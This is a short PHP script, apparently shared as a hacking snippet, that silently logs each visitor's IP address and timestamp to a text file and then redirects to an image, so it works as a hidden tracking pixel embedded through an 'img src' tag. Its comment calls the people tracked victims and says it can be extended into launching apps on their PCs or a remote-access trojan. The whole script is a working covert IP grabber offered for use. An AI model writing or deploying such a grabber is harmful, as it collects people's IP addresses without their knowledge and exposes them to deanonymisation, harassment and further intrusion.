<?php
// set ur shit urself i wont teach u ez things, can be remaked into something very big like launching apps on victim's pc, and even rat.
$filename = 'logss.txt'; // will create a txt file with that name

$ip = $_SERVER['REMOTE_ADDR']; // gets ip

$content = "$ip | " . date('Y-m-d H:i:s') . PHP_EOL; // content that will be in the txt
file_put_contents($filename, $content, FILE_APPEND);

header('Location: gnegrila.png'); // after grabbing ips will redirect u to the png so the "img src=" would work
exit();
?>
